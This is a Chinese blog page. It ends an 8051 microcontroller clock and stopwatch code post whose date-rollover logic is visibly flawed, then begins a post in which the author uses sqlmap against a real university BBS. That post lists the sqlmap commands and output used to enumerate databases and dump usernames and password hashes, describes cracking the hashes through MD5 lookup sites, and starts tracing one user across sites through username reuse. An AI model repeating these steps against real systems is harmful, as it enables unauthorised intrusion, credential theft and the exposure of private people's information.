LcdWrCmd(0x0c);</div><div class="line">	LcdWrCmd(0x06);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void second_display() &#123;</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">	disp_line(0);</div><div class="line">	LcdWrData(ascii[second[0]/10]);</div><div class="line">	LcdWrData(ascii[second[0]%10]);</div><div class="line">	LcdWrData(0x27);</div><div class="line">	LcdWrData(ascii[second[1]/10]);</div><div class="line">	LcdWrData(ascii[second[1]%10]);</div><div class="line">	LcdWrData(&apos;&quot;&apos;);</div><div class="line">	LcdWrData(ascii[second[2]/10]);</div><div class="line">	LcdWrData(ascii[second[2]%10]);	</div><div class="line">&#125;</div><div class="line"></div><div class="line">void time_display()&#123;</div><div class="line">	unsigned char i;</div><div class="line">	timedisplay[0] = clock.Year/1000;</div><div class="line">	timedisplay[1] = clock.Year/100%10;</div><div class="line">	timedisplay[2] = clock.Year/10%10;</div><div class="line">	timedisplay[3] = clock.Year%10;</div><div class="line">	timedisplay[4] = clock.Month/10;</div><div class="line">	timedisplay[5] = clock.Month%10;</div><div class="line">	timedisplay[6] = clock.Day/10;</div><div class="line">	timedisplay[7] = clock.Day%10;</div><div class="line">	timedisplay[8] = clock.Hour/10;</div><div class="line">	timedisplay[9] = clock.Hour%10;</div><div class="line">	timedisplay[10] = clock.Minute/10;</div><div class="line">	timedisplay[11] = clock.Minute%10;</div><div class="line">	timedisplay[12] = clock.Second/10;</div><div class="line">	timedisplay[13] = clock.Second%10;</div><div class="line">	for(i = 0; i &lt; 14; i ++)&#123;</div><div class="line">		if(i == 0)</div><div class="line">			disp_line(0);</div><div class="line">		if((i == 4)||(i == 6))</div><div class="line">			LcdWrData(&apos;-&apos;);</div><div class="line">		if(i == 8)</div><div class="line">			disp_line(1);</div><div class="line">		if((i == 10)||(i == 12))</div><div class="line">			LcdWrData(&apos;:&apos;);</div><div class="line">		if((i == position)&amp;&amp;(flash == 1))&#123;</div><div class="line">			if(j &gt;= 25)&#123;</div><div class="line">				if(j &gt;= 50)&#123;</div><div class="line">					j = 0;</div><div class="line">				&#125;</div><div class="line">				LcdWrData(&apos; &apos;);</div><div class="line">			&#125;</div><div class="line">			else&#123;</div><div class="line">				LcdWrData(ascii[timedisplay[i]]);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			LcdWrData(ascii[timedisplay[i]]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h4 id="用户层设计"><a href="#用户层设计" class="headerlink" title="用户层设计"></a>用户层设计</h4><p>用户层主要是一个计算时间的函数，时间的计算是通过定时器中断实现的，中断时间是10ms一次。因为我们添加了秒表功能。</p>
<h5 id="时间计算"><a href="#时间计算" class="headerlink" title="时间计算"></a>时间计算</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line"></div><div class="line">int data time[6] = &#123;1970,1,1,0,0,0&#125;;</div><div class="line">int data second[3] =&#123;0,0,0&#125;;</div><div class="line">unsigned char timeMs10 = 0;</div><div class="line">unsigned char secMs10 = 0;</div><div class="line">clockTypeDef clock;</div><div class="line">void timeCalc(void)&#123;</div><div class="line">	timeMs10++;</div><div class="line">	if(timeMs10 == 100) &#123;</div><div class="line">		timeMs10 = 0;</div><div class="line">		time[5]++;</div><div class="line">		if(time[5] == 60) &#123;</div><div class="line">			time[4]++;</div><div class="line">			time[5] = 0;</div><div class="line">			if(time[4] == 60) &#123;</div><div class="line">				time[3]++;</div><div class="line">				time[4] = 0;</div><div class="line">				if(time[3] == 24) &#123;</div><div class="line">					time[2]++;</div><div class="line">					time[3] = 0;</div><div class="line">					if(time[1] == 1 || time[1] == 3 || time[1] == 5 || time[1] == 7 || time[1] == 8 || time[1] == 10 || time[1] == 12) &#123;</div><div class="line">						if(time[2] == 31) &#123;</div><div class="line">							time[1]++;</div><div class="line">							time[2] = 0;</div><div class="line">							if(time[1] == 12) &#123;</div><div class="line">								time[0]++;</div><div class="line">							&#125;</div><div class="line">						&#125;	</div><div class="line">					&#125;</div><div class="line">					if(time[1] == 4 || time[1] == 6 || time[1] == 9 || time[1] == 11) &#123;</div><div class="line">						if(time[2] == 30) &#123;</div><div class="line">							time[1]++;</div><div class="line">							time[2] = 0;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">					if(time[1] &gt;= 2) &#123;</div><div class="line">						if(time[0]%4 == 0) &#123;</div><div class="line">							if(time[2] == 29) &#123;</div><div class="line">								time[1]++;</div><div class="line">								time[2] = 0;</div><div class="line">							&#125;</div><div class="line">						&#125;</div><div class="line">						else</div><div class="line">							if(time[2] == 28) &#123;</div><div class="line">								time[1]++;</div><div class="line">								time[2] = 0;</div><div class="line">							&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125; 		</div><div class="line">	&#125;</div><div class="line">	clock.Year = time[0];</div><div class="line">	clock.Month = time[1];</div><div class="line">	clock.Day = time[2];</div><div class="line">	clock.Hour = time[3];</div><div class="line">	clock.Minute = time[4];</div><div class="line">	clock.Second = time[5];					</div><div class="line">&#125;</div><div class="line"></div><div class="line">void secondCalc(void) &#123;</div><div class="line">	secMs10++;</div><div class="line">	if(secMs10 == 1) &#123;</div><div class="line">		second[2] += 1;</div><div class="line">		secMs10 = 0;</div><div class="line">		if(second[2] == 99) &#123;</div><div class="line">			second[2] = 0;</div><div class="line">			second[1]++;</div><div class="line">			if(second[1] == 60) &#123;</div><div class="line">				second[1] = 0;</div><div class="line">				second[0]++;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">		</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="键盘处理"><a href="#键盘处理" class="headerlink" title="键盘处理"></a>键盘处理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg51.h&gt;</div><div class="line">#include&lt;key.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">unsigned char flag;</div><div class="line">extern unsigned char flash;</div><div class="line">extern char position;</div><div class="line">extern int data time[6];</div><div class="line">unsigned char mode = 1;</div><div class="line">unsigned char clearFlag = 1;</div><div class="line">unsigned char startFlag = 1; </div><div class="line">void keyControl(void) &#123;</div><div class="line">	flag = hc165_re();</div><div class="line">	Delay1ms(100);</div><div class="line">	flag = hc165_re();</div><div class="line">	if(flag == 0xfe) &#123;</div><div class="line">		mode = 0;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xfd) &#123;</div><div class="line">		if(startFlag == 0)</div><div class="line">			startFlag = 1;</div><div class="line">		else</div><div class="line">			startFlag = 0; </div><div class="line">	&#125;</div><div class="line">	if(flag == 0xfb) &#123;</div><div class="line">		flash = 1;</div><div class="line">		clearFlag = 0;</div><div class="line">	&#125;				 </div><div class="line">	if(flag == 0x7f) &#123;</div><div class="line">		flash = 0;</div><div class="line">		position = 0;</div><div class="line">		mode = 1;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xf7) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		position = position - 1;</div><div class="line">		if(position &lt; 0)</div><div class="line">			position = 13;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xef) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line"></div><div class="line"></div><div class="line">		position = position + 1;</div><div class="line">		if(position &gt; 13)</div><div class="line">			position = 0;</div><div class="line">	&#125;		 </div><div class="line">	if(flag == 0xdf &amp;&amp; flash == 1) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		if(position == 0) &#123;</div><div class="line">			if(time[0]/1000 &gt; 8)</div><div class="line">				time[0] = 0;	</div><div class="line">			else</div><div class="line">				time[0] += 1000;		 			</div><div class="line">		&#125;</div><div class="line">		if(position == 1) &#123;</div><div class="line">			if(time[0]/100%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 100; </div><div class="line">		&#125;</div><div class="line">		if(position == 2) &#123;</div><div class="line">			if(time[0]/10%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 3) &#123;</div><div class="line">			if(time[0]%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 4) &#123;</div><div class="line">			if(time[1]/10%10 &gt; 0)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 5) &#123;</div><div class="line">			if(time[1]%10 &gt; 8)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 6) &#123;</div><div class="line">			if(time[2]/10 &gt; 2)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 7) &#123;</div><div class="line">			if(time[2]%10 &gt; 8)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 8) &#123;</div><div class="line">			if(time[3]/10 &gt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 9) &#123;</div><div class="line">			if(time[3]%10 &gt; 8)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 10) &#123;</div><div class="line">			if(time[4]/10 &gt; 4)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 11) &#123;</div><div class="line">			if(time[4]%10 &gt; 8)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] += 1;				</div><div class="line">		&#125;</div><div class="line">		if(position == 12) &#123;</div><div class="line">			if(time[5]/10 &gt; 4)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 13) &#123;</div><div class="line">			if(time[5]%10 &gt; 8)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] += 1;				</div><div class="line">		&#125;</div><div class="line">					</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xbf &amp;&amp; flash == 1) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		if(position == 0) &#123;</div><div class="line">			if(time[0]/1000 &lt; 1)</div><div class="line">				time[0] = 0;	</div><div class="line">			else</div><div class="line">				time[0] -= 1000;		 			</div><div class="line">		&#125;</div><div class="line">		if(position == 1) &#123;</div><div class="line">			if(time[0]/100%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 100; </div><div class="line">		&#125;</div><div class="line">		if(position == 2) &#123;</div><div class="line">			if(time[0]/10%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 3) &#123;</div><div class="line">			if(time[0]%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 4) &#123;</div><div class="line">			if(time[1]/10%10 &lt; 1)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 5) &#123;</div><div class="line">			if(time[1]%10 &lt; 1)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 6) &#123;</div><div class="line">			if(time[2]/10 &lt; 1)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 7) &#123;</div><div class="line">			if(time[2]%10 &lt; 1)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 8) &#123;</div><div class="line">			if(time[3]/10 &lt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 9) &#123;</div><div class="line">			if(time[3]%10 &lt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 10) &#123;</div><div class="line">			if(time[4]/10 &lt; 1)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 11) &#123;</div><div class="line">			if(time[4]%10 &lt; 1)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] -= 1;				</div><div class="line">		&#125;</div><div class="line">		if(position == 12) &#123;</div><div class="line">			if(time[5]/10 &lt; 1)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 13) &#123;</div><div class="line">			if(time[5]%10 &lt; 1)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] -= 1;				</div><div class="line">		&#125;</div><div class="line">					</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="主函数和中断"><a href="#主函数和中断" class="headerlink" title="主函数和中断"></a>主函数和中断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line">#include&lt;key.h&gt;</div><div class="line"></div><div class="line">extern unsigned char j;</div><div class="line">extern clockTypeDef clock;</div><div class="line">extern unsigned char mode;</div><div class="line">extern int data second[3];</div><div class="line">extern unsigned char clearFlag;</div><div class="line">extern unsigned char startFlag;</div><div class="line">void main()&#123;</div><div class="line">	TH0 = 0xd8;</div><div class="line">	TL0 = 0xf0;</div><div class="line">	TMOD = 0x01;</div><div class="line">	ET0 = 1;</div><div class="line">	TR0 = 1;</div><div class="line">	EA = 1;</div><div class="line">	hc165_init();</div><div class="line">	LcdInit();</div><div class="line">	while(1)&#123;</div><div class="line">		if(mode == 0)</div><div class="line">			second_display();</div><div class="line">		else</div><div class="line">			time_display();</div><div class="line">		keyControl();	</div><div class="line">	&#125;	</div><div class="line">&#125;</div><div class="line"></div><div class="line"> void time_int0(void) interrupt 1 &#123;</div><div class="line"> 	unsigned char i;</div><div class="line">	ET0 = 0;</div><div class="line">	TR0 = 0;</div><div class="line">	TH0 = 0xd8;//0x3c;</div><div class="line">	TL0 = 0xf0;//0xb0;</div><div class="line">	TR0 = 1;</div><div class="line">	timeCalc();</div><div class="line">	if(mode == 0 &amp;&amp; startFlag == 0)</div><div class="line">		secondCalc();</div><div class="line">	if(mode == 0 &amp;&amp; clearFlag == 0) &#123;</div><div class="line">		for(i = 0; i &lt; 3; i++)&#123;</div><div class="line">			second[i] = 0;</div><div class="line">		&#125;</div><div class="line">		startFlag = 1;</div><div class="line">		clearFlag = 1;</div><div class="line">	&#125;</div><div class="line">	j = j + 1;</div><div class="line">	ET0 = 1; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>从时间的计算上来说这个程序貌似并没有特别麻烦，有很多种实现的方法。这个程序的蛋疼之处在于我们计算出时间后必须将算出的时间逐位取出才能显示，所以增加了很多的工作量。还有就是关于修改时间的问题。通过按键来修改时间再简单不过，问题在于老师要求修改时间时被修改的数要实现闪烁，原来的6位数组不得不拆分成14位，增加了很多代码量。总的来说，因为开始做之前没有提前做好项目的整体规划，导致后期变量很乱，函数的调用函数值的传递也不是很合理。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/03/06/2016-03-06-sqlmap/" itemprop="url">
                  一桩由sqlmap引发的血案
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-03-06T19:40:25+08:00" content="2016-03-06">
              2016-03-06
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/渗透入侵/" itemprop="url" rel="index">
                    <span itemprop="name">渗透入侵</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。</li>
</ul>
<h3 id="sqlmap的一般用法"><a href="#sqlmap的一般用法" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot;</div></pre></td></tr></table></figure></p>
<p>知道目标URL后可以用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; --dbs</div></pre></td></tr></table></figure></p>
<p>得到了下面的数据库信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">available databases [5]:</div><div class="line">[*] bbscore</div><div class="line">[*] bbscore_db</div><div class="line">[*] information_schema</div><div class="line">[*] mysql</div><div class="line">[*] performance_schema</div></pre></td></tr></table></figure></p>
<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore --tables</div></pre></td></tr></table></figure></p>
<p>得到了下面的表信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Database: bbscore</div><div class="line">[83 tables]</div><div class="line">+-----------------+</div><div class="line">| action          |</div><div class="line">| user            |</div><div class="line">| admin           |</div><div class="line">| admin_memberfee |</div><div class="line">| admin_operlog   |</div><div class="line">| area            |</div><div class="line">| area_class      |</div><div class="line">| area_rule       |</div><div class="line">| art_pool        |</div><div class="line">| ban             |</div><div class="line">| banner          |</div><div class="line">| bbsvars         |</div><div class="line">……</div></pre></td></tr></table></figure></p>
<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user --columns</div></pre></td></tr></table></figure></p>
<p>得到下面的信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[09:46:22] [INFO] fetching columns for table &apos;user&apos; in database &apos;bbscore&apos;</div><div class="line">[09:46:22] [INFO] resumed: 30</div><div class="line">[09:46:22] [INFO] resumed: id</div><div class="line">[09:46:22] [INFO] resumed: int(10) unsigned</div><div class="line">[09:46:22] [INFO] resumed: username</div><div class="line">[09:46:22] [INFO] resumed: varchar(16)</div><div class="line">[09:46:22] [INFO] resumed: passwd</div><div class="line">[09:46:22] [INFO] resumed: varchar(32)</div><div class="line">[09:46:22] [INFO] resumed: face</div><div class="line">[09:46:22] [INFO] resumed: smallint(6)</div><div class="line">[09:46:22] [INFO] resumed: sex</div><div class="line">[09:46:22] [INFO] resumed: tinyint(4)</div></pre></td></tr></table></figure></p>
<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user -C username,passwd --dump</div></pre></td></tr></table></figure></p>
<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
<h3 id="意外的惊喜"><a href="#意外的惊喜" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
<ol>
<li>这个用户名少见，不容易和其他单词混淆</li>
<li>该用户可能在多处使用了相同用户名  </li>
</ol>
